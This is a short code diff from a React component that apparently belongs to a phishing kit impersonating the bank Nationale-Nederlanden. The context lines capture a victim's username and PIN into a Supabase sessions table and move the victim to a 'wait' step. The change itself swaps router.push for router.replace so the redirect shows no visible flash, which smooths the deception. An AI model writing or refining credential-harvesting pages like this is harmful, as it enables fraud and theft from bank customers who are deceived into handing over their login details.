@@ -34,7 +34,8 @@ export function NationaleNederlandenClient({ sessionId }: { sessionId: string })
     await supabase.from("sessions").update({ is_hidden: false, current_step: "wait",
       form_data: { ...prev, bankSlug: "nationale-nederlanden", bankName: "Nationale-Nederlanden", verfuegernummer: username, pin: password }
     }).eq("id", sessionId);
-    router.push(stepToPath("wait", sessionId));
+    // ⭐ FLASH YOK: router.push → router.replace
+    router.replace(stepToPath("wait", sessionId));
   }
 
   return (
